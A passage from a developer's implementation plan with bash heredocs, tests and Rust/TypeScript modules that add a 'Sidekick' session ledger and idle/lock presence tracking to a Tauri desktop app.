    const p = { hook_event_name: names[rnd(names.length)], session_id: rnd(20) === 0 ? undefined : `s${rnd(30)}`, nm_agent: ["gemini", "antigravity", undefined, "BAD NAME", "claude"][rnd(5)], cwd: rnd(3) ? "C:\\w\\a" : 5, tool_name: tools[rnd(tools.length)], tool_input: rnd(4) ? { command: "x".repeat(rnd(50)), file_path: "C:\\a\\b" + rnd(9) } : [1, 2], agent_id: rnd(3) ? undefined : `a${rnd(5)}` };
    assert.doesNotThrow(() => l.feed(p, 1000 + i * 1000));
  }
  assert.ok(l.snapshot.sessions.length <= 8);
  assert.ok(l.snapshot.sessions.every((s) => s.ring.length <= 40 && Object.keys(s.subagents).length <= 20));
});

test("platformName: Windows is Windows, anything else here is Linux, and never the Mac", () => {
  assert.equal(platformName("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"), "windows");
  assert.equal(platformName("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15"), "linux");
  assert.equal(platformName("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"), "linux");
  assert.equal(platformName(""), "linux");
});

test("the hook handler feeds the ledger before it can refuse an event, after a chat's own run is set aside; the click on a card is recorded; main.ts installs the Sidekick", () => {
  const hooks = source("island/hooks.ts");
  const feed = hooks.indexOf("Hub.sk?.hook(payload);");
  assert.ok(feed > 0, "the feed call is there");
  assert.equal(hooks.split("Hub.sk?.hook(payload);").length - 1, 1, "once");
  assert.ok(hooks.indexOf('routeHook(payload, State.claudeSessions) === "chat"') < feed, "a chat's own Claude Code run is not a session: set aside before the feed");
  assert.ok(feed < hooks.indexOf("const name = payload.hook_event_name"), "before the event is read for the pill");
  assert.ok(feed < hooks.indexOf("State.pendingApproval.requestId !== requestId"), "before the one-card gate that declines a second request");
  assert.ok(feed < hooks.indexOf("if (isExternalAgent) {\n        if (payload.request_id) void Bridge.approvalDecline"), "before the decline of an external agent's request");
  assert.match(source("island/island.ts"), /void Bridge\.approvalDecision\(req\.requestId, d\);\s*Hub\.sk\?\.approvalAnswered\("integration_claude", req\.sessionId\);/);
  const main = source("main.ts");
  assert.match(main, /Hub\.sk = new Sidekick\(sidekickEnv\(.*\)\);/);
  assert.ok(main.search(/Hub\.sk = new Sidekick\(sidekickEnv\(.*\)\);/) < main.indexOf("registerHookHandlers(island);"), "installed before the first hook event can arrive");
  assert.match(source("sidekick/appenv.ts"), /now: \(\) => Date\.now\(\)( \+ Skew\.ms)?,\s*platform: platformName\(\)/);
  assert.equal(Hub.sk, null, "the module itself installs nothing");
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write the modules and the three edits**

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/ledger.ts <<'EOF'
// The Sidekick's memory (sub-project F1, spec "The ledger"): one small record per session, kept from the hook events, in memory only. It holds what the contract's
// `eventFrom` and `ledgerApply` keep (a basename, a command key, counts, times) and nothing else: not the prompt, not the assistant's text, not `transcript_path`, not a
// command, not a full path. It is never written to disk, never logged and gone when the app quits. Loaded by the plain-Node checks.

import { approvalAnsweredEvent, emptyLedger, eventFrom, ledgerApply, ledgerPrune, liveSessions, markNudged } from "./core.ts";
import type { Ledger, Session, SidekickEvent } from "./core.ts";

export class SessionLedger {
  private ledger: Ledger = emptyLedger();

  /**
   * A hook payload comes in and the event it makes goes into the ledger; the event is returned, or null when the payload is not one the ledger knows (an unknown event, a
   * payload that is not an object). `now` is the time the app received it, in ms. There is no Codex on Windows and Linux, so `codex` is off.
   */
  feed(payload: unknown, now: number): SidekickEvent | null {
    const ev = eventFrom(payload, now, { codex: false });
    if (!ev) return null;
    this.ledger = ledgerApply(this.ledger, ev);
    return ev;
  }

  /** The user's click on an approval card: the app makes this event, it is not a hook. */
  answered(agentId: string, sessionId: string, now: number): void {
    this.ledger = ledgerApply(this.ledger, approvalAnsweredEvent(agentId, sessionId, now));
  }

  /** A session was nudged: it gets no second nudge. */
  markNudged(key: string, now: number): void {
    this.ledger = markNudged(this.ledger, key, now);
  }

  /** Drops what is over: 30 minutes after a session's end, 12 hours after the last event of one that never ended. */
  prune(now: number): void {
    this.ledger = ledgerPrune(this.ledger, now);
  }

  /** The ledger as the pure rules take it. It is never changed in place: every change makes a new one. */
  get snapshot(): Ledger {
    return this.ledger;
  }

  /** The sessions that have not ended. */
  get live(): Session[] {
    return liveSessions(this.ledger);
  }

  clear(): void {
    this.ledger = emptyLedger();
  }
}
EOF
```

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/platform.ts <<'EOF'
// Which system this is, for the one rule that differs: when the app gives up on a permission request (Windows and Linux at 110 s, the Mac at 115 s). The Windows and Linux
// app is never the Mac. Pure: the user agent is a parameter, so the plain-Node checks can say what they like.

import type { Platform } from "./core.ts";

export function platformName(userAgent: string = typeof navigator === "undefined" ? "" : navigator.userAgent): Exclude<Platform, "mac"> {
  return /windows/i.test(userAgent) ? "windows" : "linux";
}
EOF
```

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/hub.ts <<'EOF'
// The one place the island's other modules find the Sidekick (hooks.ts feeds it, the chat asks it, the cards read it). Set once by main.ts. Null while it is not set, and
// every caller treats null as "no sidekick": the island works the same without it. No imports of the island, so nothing here can be a cycle.

import type { Sidekick } from "./controller.ts";

export const Hub: { sk: Sidekick | null } = { sk: null };
EOF
```

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/controller.ts <<'EOF'
// The Sidekick (sub-project F1): the glue between the hook events, the ledger and the pure rules of src/sidekick/core.ts. The rules decide everything; this class only
// feeds them and carries out the answers. It never blocks a hook, never answers an approval and never reads a transcript. Loaded by the plain-Node checks: it knows nothing of
// the DOM, the island or Tauri (the island gives it what it needs through `SidekickEnv`).

import { SessionLedger } from "./ledger.ts";
import type { Platform } from "./core.ts";

/** What the Sidekick needs from the world. */
export interface SidekickEnv {
  /** Wall-clock milliseconds: it keeps counting while the machine sleeps, as a monotonic clock may not. */
  now(): number;
  platform: Exclude<Platform, "mac">;
}

export class Sidekick {
  readonly ledger = new SessionLedger();
  private readonly env: SidekickEnv;

  constructor(env: SidekickEnv) {
    this.env = env;
  }

  /**
   * One hook event, fed before anything else can refuse it (a request displaced by the one card, or declined for another agent, is still counted). It must never throw into the
   * island's hook handler: a failure here is the Sidekick's own and costs it one event.
   */
  hook(payload: unknown): void {
    try {
      this.ledger.feed(payload, this.env.now());
    } catch {
      // The sidekick never breaks the island.
    }
  }

  /** The user clicked Allow or Deny on a card. */
  approvalAnswered(agentId: string, sessionId: string): void {
    try {
      this.ledger.answered(agentId, sessionId, this.env.now());
    } catch {
      // Same.
    }
  }
}
EOF
```

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/appenv.ts <<'EOF'
// What the island gives the Sidekick (sub-project F1): the clock, the system's name and the few questions only the app can answer. This is the one place the Sidekick's pure
// modules meet Tauri; they are given it, and import nothing of it themselves.

import type { SidekickEnv } from "./controller.ts";
import { platformName } from "./platform.ts";

export function sidekickEnv(): SidekickEnv {
  return { now: () => Date.now(), platform: platformName() };
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/island/hooks.ts", r'''import { agentColor } from "../core/pills.ts";
''', r'''import { agentColor } from "../core/pills.ts";
import { Hub } from "../sidekick/hub.ts";
''')
edit("windows/src/island/hooks.ts", r'''  if (routeHook(payload, State.claudeSessions) === "chat") {
    handleChatHook(island, payload);
    return;
  }

  const name = payload.hook_event_name ?? "";
''', r'''  if (routeHook(payload, State.claudeSessions) === "chat") {
    handleChatHook(island, payload);
    return;
  }

  // The Sidekick's ledger (sub-project F1) is fed here, before anything below can refuse the event: a request that the one card displaces, or that is declined for another
  // agent, is still counted. It never throws and never waits.
  Hub.sk?.hook(payload);

  const name = payload.hook_event_name ?? "";
''')

edit("windows/src/island/island.ts", r'''import { releaseChatApprovals, resurfaceChatApproval } from "./hooks";
''', r'''import { releaseChatApprovals, resurfaceChatApproval } from "./hooks";
import { Hub } from "../sidekick/hub.ts";
''')
edit("windows/src/island/island.ts", r'''        void Bridge.approvalDecision(req.requestId, d);
        State.subagentApprovalOver(req);
''', r'''        void Bridge.approvalDecision(req.requestId, d);
        Hub.sk?.approvalAnswered("integration_claude", req.sessionId);
        State.subagentApprovalOver(req);
''')
PY
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/main.ts", r'''import { registerIntegrationHandlers, refreshConfigured } from "./island/integrations";
''', r'''import { registerIntegrationHandlers, refreshConfigured } from "./island/integrations";
import { sidekickEnv } from "./sidekick/appenv";
import { Sidekick } from "./sidekick/controller.ts";
import { Hub } from "./sidekick/hub.ts";
''')
edit("windows/src/main.ts", r'''  registerHookHandlers(island);
''', r'''  // The Sidekick (sub-project F1): it is told every hook event before the island's own handler can refuse it.
  Hub.sk = new Sidekick(sidekickEnv());
  registerHookHandlers(island);
''')
edit("windows/src/main.ts", r'''.__nm = { island, State, hook: (payload: HookPayload) => handleHook(island, payload) };''', r'''.__nm = { island, State, hook: (payload: HookPayload) => handleHook(island, payload) };
  if (import.meta.env.DEV) (window as unknown as { __nm: { sk: unknown } }).__nm.sk = Hub.sk;''')
PY
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 26`, `ℹ pass 26`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

- [ ] **Step 3: Prove the feed's place is pinned**

Moving the feed after the one-card gate would lose the displaced request. The pin must fail.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/island/hooks.ts $'  Hub.sk?.hook(payload);\n\n  const name = payload.hook_event_name' $'  const name = payload.hook_event_name' scripts/sidekick-tests/ledger.test.mjs )
```

Expected: `# fail 1`.

- [ ] **Step 4: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src/sidekick windows/src/island windows/src/main.ts windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): the sidekick's ledger, fed before the approval gate

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 5: Away and back: the platform's news, the idle time and lazy sampling

**Agent: `nm-implementer-deep` (Sonnet 5.5, trigger 1: operating-system APIs).** The watchers that tell the desktop cat about a lock and the display (`platform::watch_away`) take **one** callback and the Windows one stores it in a `OnceLock`; this task makes that one callback tell two listeners, adds the two idle readers, and decides what "back" means when the idle time is only read when something asks.

**Files:**
- Create: `windows/src-tauri/src/sidekick_presence.rs`, `sidekick.rs`, `windows/src/sidekick/presence.ts`, `windows/scripts/sidekick-tests/presence.test.mjs`
- Modify: `windows/src-tauri/src/lib.rs` (`mod`s, the command, the one callback), `platform/windows.rs` (`idle_seconds`), `platform/linux.rs` (`idle_seconds`), `windows/src/sidekick/controller.ts`, `appenv.ts`, `windows/src/core/bridge.ts`, `windows/src/main.ts`, `windows/src/island/island.ts`, `windows/scripts/sidekick-tests/ledger.test.mjs`

**Interfaces:**
- Consumes: Task 4's `Sidekick`, `SidekickEnv`, `SessionLedger.live`; Task 1's `presenceInit`, `presenceStep`.
- Produces: `class Presence` (`away`, `awaySince`, `signal(word, now) → Return | null`, `sample(seconds, now) → Return | null`), `isAwayWord`, `AWAY_WORDS`, `Return {awaySince, awayMs}`; `SidekickEnv.idleSeconds(): Promise<number | null>`; `Sidekick.presence`, `Sidekick.onReturn: Array<(r: Return) => void>`, `presenceSignal(word)`, `sampleIdle(force?)`, `islandOpened()`, `SAMPLE_GAP_MS = 5000`; the Tauri event `sidekick-away` `{signal}` and the command `sidekick_idle_seconds`; Rust `away_signal(source, on, windows) → &str`, `idle_seconds_from_ticks`, `parse_idle_ms`, `platform::idle_seconds() → Option<u64>` (Task 10 adds `clipboard_text_ok` to the same pure file).

**What the platform gives, and what the words mean.** Windows reports a lock and an unlock (`WM_WTSSESSION_CHANGE`; this task adds the console and remote disconnects and connects, which is what a **switch to another user** is: the owner's answer, lock and user-switch are away) and the display going off or on; Linux reports a lock and an unlock (logind `Lock`, `Unlock`, `LockedHint`, and, new here, the session's `Active` going false when the user switches to another session) and the machine going to sleep or waking (`PrepareForSleep`). The watchers call both `AwaySource::Off`; `away_signal` turns `(source, on, windows)` into the contract's word: `Off` is `displayOff` and `displayOn` on Windows and `sleep` and `wake` on Linux. **Idle** is `GetLastInputInfo` on Windows and, on Linux, GNOME's idle monitor over the session bus, asked through `gdbus` (a program of glib, with a 1 s limit; plan decision: no new crate and no `gio` call that this machine cannot compile), and nothing elsewhere (KDE, wlroots): there only a lock or a sleep is away. **It is read only** when a hook event comes (at most every 5 s), when the island opens, and on an unlock, a wake or the display coming on; and only while an agent is running or the user is away. So the contract's "back" (a sample under 3 s) would almost never be seen: **`Presence.sample` compares the sample with the previous one, and when the idle time is less than it could have grown to, the user touched the machine since, at `now − seconds`; the rule is told so first**, and the recap then counts from the real time away.

- [ ] **Step 1: Write the TypeScript test**

It covers the six words, a lock and an unlock, the reasons that must all let go, idle away and back at the real time, the samples that are not samples, a fuzz (a return is told exactly when the last reason lets go, never twice in a row), the rate limit (5 s, only while it can matter, forced by an unlock, never two at once), and pins that nothing polls: no timer in the three modules, no thread, loop or interval in the Rust files.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/presence.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { Presence, isAwayWord } from "../../src/sidekick/presence.ts";
import { SAMPLE_GAP_MS, Sidekick } from "../../src/sidekick/controller.ts";
import { source } from "./util.mjs";

const T0 = 1_000_000;
const s = (n) => n * 1000;

test("the six words of the platform are the signals; anything else is no word", () => {
  for (const w of ["lock", "unlock", "sleep", "wake", "displayOff", "displayOn"]) assert.ok(isAwayWord(w), w);
  for (const w of ["Lock", "idle", "", null, undefined, 7, {}, ["lock"]]) assert.equal(isAwayWord(w), false, String(w));
  const p = new Presence();
  for (const w of ["idle", "Lock", 7, null]) assert.equal(p.signal(w, T0), null);
  assert.equal(p.away, false);
});

test("a lock and an unlock: away from the lock, back at the unlock, told once", () => {
  const p = new Presence();
  assert.equal(p.signal("lock", T0), null);
  assert.equal(p.away, true);
  assert.equal(p.awaySince, T0);
  assert.deepEqual(p.signal("unlock", T0 + s(300)), { awaySince: T0, awayMs: s(300) });
  assert.equal(p.away, false);
  assert.equal(p.signal("unlock", T0 + s(301)), null, "never told twice");
});

test("away holds until the last reason lets go: a lock, then the display, then an unlock, then the display on", () => {
  const p = new Presence();
  p.signal("lock", T0);
  p.signal("displayOff", T0 + s(5));
  assert.equal(p.signal("unlock", T0 + s(60)), null, "the display is still off");
  assert.deepEqual(p.signal("displayOn", T0 + s(90)), { awaySince: T0, awayMs: s(90) });
});

test("idle: 300 s of no input is away from the moment the input stopped, and a sample with input since is back at that input, not when it was noticed", () => {
  const p = new Presence();
  assert.equal(p.sample(10, T0), null);
  assert.equal(p.away, false);
  assert.equal(p.sample(400, T0 + s(5)), null);
  assert.equal(p.away, true);
  assert.equal(p.awaySince, T0 + s(5) - s(400), "the away began when the last input was");
  assert.equal(p.sample(460, T0 + s(65)), null, "still no input: still away");
  // 90 s later the system says the last input was 10 s ago: the user came back 80 s after the previous sample (65 s + 90 s - 10 s).
  const back = p.sample(10, T0 + s(155));
  assert.deepEqual(back, { awaySince: T0 + s(5) - s(400), awayMs: T0 + s(145) - (T0 + s(5) - s(400)) });
  assert.equal(p.away, false);
  assert.equal(p.sample(11, T0 + s(156)), null, "told once");
});

test("a sample between 3 and 300 s of idle, taken after nothing at all, changes nothing; a quick sample after a long one is back", () => {
  const p = new Presence();
  assert.equal(p.sample(100, T0), null);
  assert.equal(p.away, false);
  assert.equal(p.sample(500, T0 + s(400)), null);
  assert.equal(p.away, true);
  assert.deepEqual(Object.keys(p.sample(1, T0 + s(402))), ["awaySince", "awayMs"]);
});

test("a sample that is not a number from 0 up is no sample, and the previous one is kept", () => {
  const p = new Presence();
  p.sample(400, T0);
  for (const bad of [Number.NaN, Number.POSITIVE_INFINITY, -1, "400", null, undefined, {}]) assert.equal(p.sample(bad, T0 + s(10)), null, String(bad));
  assert.equal(p.sample(5, Number.NaN), null, "nor a time that is not a time");
  assert.equal(p.away, true, "nothing above ended the away");
});

test("a lock together with idle: the unlock is not enough, the idle lets go with the next sample, and the away began at the first of them", () => {
  const p = new Presence();
  p.sample(400, T0);
  p.signal("lock", T0 + s(10));
  assert.equal(p.awaySince, T0 - s(400));
  assert.equal(p.signal("unlock", T0 + s(100)), null, "idle still holds");
  const back = p.sample(2, T0 + s(101));
  assert.equal(back.awaySince, T0 - s(400));
  assert.equal(back.awayMs, T0 + s(99) - (T0 - s(400)), "back at the input, 2 s before the sample");
});

test("a fuzz of signals and samples: a return is told exactly when the last reason lets go, never twice in a row and never while away", () => {
  let seed = 7;
  const rnd = (n) => { seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0; return seed % n; };
  for (let round = 0; round < 40; round++) {
    const p = new Presence();
    let t = T0, idle = 0, lastReturn = false, returns = 0, aways = 0, wasAway = false;
    for (let i = 0; i < 300; i++) {
      t += rnd(200) * 1000;
      idle = rnd(3) === 0 ? rnd(8) : idle + (rnd(2) ? rnd(120) : 0);
      const r = rnd(3) === 0 ? p.signal(["lock", "unlock", "sleep", "wake", "displayOff", "displayOn"][rnd(6)], t) : p.sample(idle, t);
      if (!wasAway && p.away) aways++;
      if (r) { returns++; assert.ok(r.awayMs >= 0 && r.awaySince <= t, "the away lasted a time that makes sense"); assert.equal(lastReturn, false, "never twice in a row"); }
      lastReturn = r !== null;
      wasAway = p.away;
    }
    assert.ok(returns <= aways, `${returns} returns for ${aways} aways`);
  }
});

/** A Sidekick on a clock the test turns, with an idle reading it controls and counts. */
function world() {
  const w = { t: T0, idle: 0, calls: 0, fail: false, hold: null };
  const sk = new Sidekick({
    now: () => w.t, platform: "windows",
    idleSeconds: () => {
      w.calls++;
      if (w.hold) return w.hold;
      return w.fail ? Promise.reject(new Error("no")) : Promise.resolve(w.idle);
    },
  });
  const returns = [];
  sk.onReturn.push((r) => returns.push(r));
  return { w, sk, returns };
}
const hook = (name, extra = {}) => ({ hook_event_name: name, session_id: "S1", cwd: "C:\\work\\app", ...extra });
const settle = () => new Promise((r) => setTimeout(r, 0));

test("the idle time is read only while it can matter, at most every 5 s, never on a timer", async () => {
  const { w, sk } = world();
  await sk.sampleIdle();
  assert.equal(w.calls, 0, "no agent is running and the user is not away: nothing to look at");
  sk.hook(hook("PreToolUse", { tool_name: "Bash", tool_input: { command: "ls" } }));
  await settle();
  assert.equal(w.calls, 1, "a hook event with an agent running reads it");
  w.t += s(2);
  sk.hook(hook("PostToolUse", { tool_name: "Bash", tool_input: { command: "ls" } }));
  await settle();
  assert.equal(w.calls, 1, "another within 5 s does not");
  w.t += SAMPLE_GAP_MS;
  sk.islandOpened();
  await settle();
  assert.equal(w.calls, 2, "the island opening reads it once the 5 s are over");
  assert.equal(SAMPLE_GAP_MS, 5000);
});

test("an unlock, a wake and the display coming on read it at once; a lock does not; a failing or odd reading is no reading", async () => {
  const { w, sk } = world();
  sk.hook(hook("PreToolUse", { tool_name: "Bash", tool_input: { command: "ls" } }));
  await settle();
  const base = w.calls;
  sk.presenceSignal("lock");
  await settle();
  assert.equal(w.calls, base, "a lock is not a moment to look");
  for (const word of ["unlock", "wake", "displayOn"]) {
    const before = w.calls;
    sk.presenceSignal(word);
    await settle();
    assert.equal(w.calls, before + 1, word);
  }
  w.fail = true;
  await sk.sampleIdle(true);
  w.fail = false;
  w.idle = Number.NaN;
  await sk.sampleIdle(true);
  w.idle = null;
  await sk.sampleIdle(true);
  assert.doesNotThrow(() => sk.presenceSignal(undefined));
});

test("a second reading is never started while one is on its way", async () => {
  const { w, sk } = world();
  sk.hook(hook("PreToolUse", { tool_name: "Bash", tool_input: { command: "ls" } }));
  await settle();
  let release;
  w.hold = new Promise((r) => { release = r; });
  w.calls = 0;
  const first = sk.sampleIdle(true);
  const second = sk.sampleIdle(true);
  await settle();
  assert.equal(w.calls, 1);
  release(0);
  await Promise.all([first, second]);
});

test("away by idle and back: the Sidekick tells its listeners once, with the real time away", async () => {
  const { w, sk, returns } = world();
  sk.hook(hook("PreToolUse", { tool_name: "Bash", tool_input: { command: "ls" } }));
  await settle();
  w.t += s(10); w.idle = 400;
  await sk.sampleIdle(true);
  assert.equal(sk.presence.away, true);
  w.t += s(120); w.idle = 6;
  await sk.sampleIdle(true);
  assert.equal(returns.length, 1);
  assert.equal(returns[0].awayMs, s(514), "the user was last at the keyboard 400 s before the first sample and came back 124 s after it");
  assert.equal(returns[0].awaySince, T0 + s(10) - s(400));
});

test("no timer, no interval and no thread: the Sidekick's presence never polls", () => {
  for (const f of ["controller.ts", "presence.ts", "ledger.ts"]) assert.doesNotMatch(source(`sidekick/${f}`), /setInterval|setTimeout|requestAnimationFrame/, f);
  const rust = ["sidekick.rs", "sidekick_presence.rs"].map((f) => fs.readFileSync(new URL(`../../src-tauri/src/${f}`, import.meta.url), "utf8")).join("\n");
  assert.doesNotMatch(rust, /thread::spawn|loop \{|interval|sleep\(/, "the Rust side only answers and forwards");
});

test("the wiring: the platform's news reaches the Sidekick, the island's opening is a moment to look, and Rust has one command and one callback for it", () => {
  assert.match(source("main.ts"), /onEvent<\{ signal: string \}>\("sidekick-away", \(\{ signal \}\) => Hub\.sk\?\.presenceSignal\(signal\)\);/);
  assert.match(source("island/island.ts"), /if \(mode !== "hidden"\) Hub\.sk\?\.islandOpened\(\);/);
  assert.match(source("core/bridge.ts"), /sidekickIdleSeconds: \(\) => call<number>\("sidekick_idle_seconds"\)/);
  assert.match(source("sidekick/appenv.ts"), /idleSeconds: async \(\) => \(await Bridge\.sidekickIdleSeconds\(\)\) \?\? null/);
  const lib = fs.readFileSync(new URL("../../src-tauri/src/lib.rs", import.meta.url), "utf8");
  assert.match(lib, /sidekick::sidekick_idle_seconds,/);
  assert.match(lib, /desktop::away_changed\(&away_handle, &away_gate, source, on\);\s*sidekick::away_changed\(&away_handle, source, on\);/);
  const win = fs.readFileSync(new URL("../../src-tauri/src/platform/windows.rs", import.meta.url), "utf8");
  assert.match(win, /GetLastInputInfo/);
  const lin = fs.readFileSync(new URL("../../src-tauri/src/platform/linux.rs", import.meta.url), "utf8");
  assert.match(lin, /org\.gnome\.Mutter\.IdleMonitor/);
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: The Rust side first (the TypeScript test pins its files)**

`sidekick_presence.rs` is pure (the word table, the tick arithmetic that survives the 32-bit counter wrapping, the GNOME answer parser) with its tests; `sidekick.rs` forwards the news to the island's window and answers `sidekick_idle_seconds` off the async threads. The two platform readers and the one callback that now tells both listeners are in the edit script. **Plan decisions to confirm with the owner:** idle on Linux through `gdbus` and not at all elsewhere, as the spec allows ("only if GNOME's idle monitor is there").

```bash
mkdir -p windows/src-tauri/src
cat > windows/src-tauri/src/sidekick_presence.rs <<'EOF'
// The Sidekick's presence signals, the pure part (sub-project F1, spec "Away and recap"): which word the app's page gets for a news from the platform's watchers, how long the
// user has been idle by the system's own counters, and how to read GNOME's answer. No state, no I/O, no Tauri: `sidekick.rs` and `platform/` call these.

use crate::desktop::AwaySource;

/// The word the contract's `presenceStep` knows for one news of a platform watcher (`desktop::AwaySource`). Windows reports a lock or unlock and the display going off or on; Linux
/// reports a lock or unlock and, from logind's `PrepareForSleep`, the machine going to sleep or waking, which the watcher calls `Off`. So the same `Off` is the display on Windows and
/// the machine on Linux.
pub fn away_signal(source: AwaySource, on: bool, windows: bool) -> &'static str {
    match (source, on, windows) {
        (AwaySource::Locked, true, _) => "lock",
        (AwaySource::Locked, false, _) => "unlock",
        (AwaySource::Off, true, true) => "displayOff",
        (AwaySource::Off, false, true) => "displayOn",
        (AwaySource::Off, true, false) => "sleep",
        (AwaySource::Off, false, false) => "wake",
    }
}

/// Seconds between the tick of the last input and the tick now. Both are 32-bit millisecond counters (`GetLastInputInfo`, `GetTickCount`) that wrap around every 49.7 days, so the
/// difference wraps too.
pub fn idle_seconds_from_ticks(now: u32, last_input: u32) -> u64 {
    u64::from(now.wrapping_sub(last_input)) / 1000
}

/// What `gdbus call … GetIdletime` prints for GNOME's idle monitor: `(uint64 12345,)`, milliseconds. Anything else is None.
pub fn parse_idle_ms(output: &str) -> Option<u64> {
    let inner = output.trim().strip_prefix('(')?.strip_suffix(')')?;
    let inner = inner.strip_suffix(',').unwrap_or(inner).trim();
    inner.strip_prefix("uint64 ")?.trim().parse().ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_news_of_a_watcher_is_a_word_the_presence_rule_knows() {
        let known = ["lock", "unlock", "sleep", "wake", "displayOff", "displayOn"];
        for source in [AwaySource::Locked, AwaySource::Off] {
            for on in [true, false] {
                for windows in [true, false] {
                    let word = away_signal(source, on, windows);
                    assert!(known.contains(&word), "{word}");
                }
            }
        }
        assert_eq!(away_signal(AwaySource::Locked, true, true), "lock");
        assert_eq!(away_signal(AwaySource::Locked, false, false), "unlock");
        assert_eq!(away_signal(AwaySource::Off, true, true), "displayOff", "Windows: the display went off");
        assert_eq!(away_signal(AwaySource::Off, false, true), "displayOn");
        assert_eq!(away_signal(AwaySource::Off, true, false), "sleep", "Linux: the machine is going to sleep");
        assert_eq!(away_signal(AwaySource::Off, false, false), "wake");
    }

    #[test]
    fn idle_seconds_are_whole_seconds_and_survive_the_counter_wrapping() {
        assert_eq!(idle_seconds_from_ticks(10_000, 7_400), 2);
        assert_eq!(idle_seconds_from_ticks(5_000, 5_000), 0);
        assert_eq!(idle_seconds_from_ticks(299_999, 0), 299);
        assert_eq!(idle_seconds_from_ticks(300_000, 0), 300);
        // The tick counter wrapped between the input and now: 1 s before the wrap and 2 s after is 3 s.
        assert_eq!(idle_seconds_from_ticks(2_000, u32::MAX - 999), 3);
    }

    #[test]
    fn gnomes_answer_is_read_and_anything_else_is_nothing() {
        assert_eq!(parse_idle_ms("(uint64 12345,)\n"), Some(12345));
        assert_eq!(parse_idle_ms("(uint64 0,)"), Some(0));
        assert_eq!(parse_idle_ms("  (uint64 300000,)  "), Some(300_000));
        for odd in ["", "()", "(,)", "(uint64 ,)", "(uint64 -5,)", "(int32 5,)", "(uint64 5, 6)", "Error: GDBus.Error:org.freedesktop.DBus.Error.ServiceUnknown", "uint64 5", "(uint64 99999999999999999999,)"] {
            assert_eq!(parse_idle_ms(odd), None, "{odd:?}");
        }
    }
}
EOF
```

```bash
mkdir -p windows/src-tauri/src
cat > windows/src-tauri/src/sidekick.rs <<'EOF'
// The Sidekick's side of the platform (sub-project F1, spec "Away and recap"): the lock, sleep and display news that the desktop cat already receives are told to the island's page
// too, and the page can ask how long the user has been idle. Nothing here polls: the watchers are the platform's own notifications, and the idle time is read only when the page
// asks (on a hook event, when the island opens and on an unlock, never on a timer).

use tauri::{AppHandle, Emitter};

use crate::desktop::AwaySource;
use crate::island;
use crate::sidekick_presence::away_signal;

/// One news of a platform watcher (`platform::watch_away` calls this beside the desktop cat's `away_changed`): the island's page is told the word for it, once.
pub fn away_changed(app: &AppHandle, source: AwaySource, on: bool) {
    let signal = away_signal(source, on, cfg!(windows));
    let _ = app.emit_to(island::WINDOW_LABEL, "sidekick-away", serde_json::json!({ "signal": signal }));
}

/// Seconds since the user's last keyboard or mouse input, or null where the system does not say (a Linux desktop that is not GNOME). It runs off the async threads: on Linux it
/// asks a helper program and waits for it.
#[tauri::command]
pub async fn sidekick_idle_seconds() -> Option<u64> {
    tauri::async_runtime::spawn_blocking(crate::platform::idle_seconds).await.ok().flatten()
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src-tauri/src/lib.rs", r'''mod settings;
mod sidekick_settings;
mod tray;
''', r'''mod settings;
mod sidekick;
mod sidekick_presence;
mod sidekick_settings;
mod tray;
''')
edit("windows/src-tauri/src/lib.rs", r'''            desktop::desktop_menu_text,
        ])
''', r'''            desktop::desktop_menu_text,
            sidekick::sidekick_idle_seconds,
        ])
''')
edit("windows/src-tauri/src/lib.rs", r'''            platform::watch_away(move |source, on| desktop::away_changed(&away_handle, &away_gate, source, on));
''', r'''            // The Sidekick's page hears the same news (a lock, the display, a sleep) as the words of `presenceStep`; the watcher takes one callback, so this one calls both.
            platform::watch_away(move |source, on| {
                desktop::away_changed(&away_handle, &away_gate, source, on);
                sidekick::away_changed(&away_handle, source, on);
            });
''')

edit("windows/src-tauri/src/platform/windows.rs", r'''/// The system's double-click time in ms.
pub fn double_click_ms() -> Option<u32> {
    Some(unsafe { ::windows::Win32::UI::Input::KeyboardAndMouse::GetDoubleClickTime() })
}
